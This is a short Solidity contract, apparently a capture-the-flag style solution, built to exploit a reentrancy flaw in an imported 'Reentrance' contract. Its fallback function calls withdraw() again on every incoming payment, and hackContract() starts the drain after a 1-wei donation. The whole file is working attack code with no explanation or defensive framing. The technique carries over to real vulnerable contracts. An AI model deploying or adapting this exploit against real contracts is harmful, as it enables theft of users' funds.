// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;
    Reentrance reentrance;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
        reentrance = Reentrance(_contractAddress);
    }

    fallback() external payable {
        reentrance.withdraw();
    }

    function hackContract() external {
                reentrance.donate{value: 1}(address(this));
        reentrance.withdraw();
    }
}
